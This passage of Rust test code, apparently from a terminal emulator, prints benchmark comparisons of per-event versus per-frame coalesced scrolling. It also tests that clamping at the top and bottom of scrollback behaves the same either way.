                 p50={:?} p95={:?} p99={:?} worst={:?} within_budget={} (non-gating)",
                run.commands,
                run.captures,
                run.wire_bytes,
                run.latency.median,
                run.latency.p95,
                run.latency.p99,
                run.latency.worst,
                budget.accepts(run.latency)
            );
        }
        println!(
            "scroll workload [saving] commands x{:.2} wire_bytes x{:.2} total_capture_time \
             {:?} -> {:?}",
            per_event.commands as f64 / per_frame.commands as f64,
            per_event.wire_bytes as f64 / per_frame.wire_bytes as f64,
            per_event.latency.median * per_event.commands as u32,
            per_frame.latency.median * per_frame.commands as u32
        );
    }

    /// Folding must not change where a gesture stops, which is the one place
    /// a summed delta could plausibly differ from the notches it replaced.
    #[test]
    fn overshooting_either_bound_clamps_the_same_whether_or_not_it_was_coalesced() {
        let overshoot = SCROLLBACK_LINES as isize * 2;
        let notches = (overshoot / LINES_PER_NOTCH) as usize;

        let top_per_event = scroll_run(std::iter::repeat_n(-LINES_PER_NOTCH, notches));
        let top_per_frame = scroll_run(std::iter::repeat_n(
            -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
            notches / NOTCHES_PER_FRAME,
        ));
        assert_eq!(top_per_event.offset, 0, "the top of scrollback is row zero");
        assert_eq!(top_per_frame.offset, 0);
        assert_eq!(top_per_frame.screen, top_per_event.screen);

        // Coming back down has to land on the live screen again, not one row
        // short of it or past the end of history.
        let bottom_per_event = scroll_run(
            std::iter::repeat_n(-LINES_PER_NOTCH, notches)
                .chain(std::iter::repeat_n(LINES_PER_NOTCH, notches)),
        );
        let bottom_per_frame = scroll_run(
            std::iter::repeat_n(
                -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
                notches / NOTCHES_PER_FRAME,
            )
            .chain(std::iter::repeat_n(
                LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
                notches / NOTCHES_PER_FRAME,
            )),
        );
        assert_eq!(bottom_per_frame.offset, bottom_per_event.offset);
        assert_eq!(bottom_per_frame.screen, bottom_per_event.screen);
        assert_eq!(
            (bottom_per_event.offset, &bottom_per_event.screen),
            (bottom_per_event.origin.0, &bottom_per_event.origin.1),
            "returning to the bottom must show the live screen again"
        );
    }
}
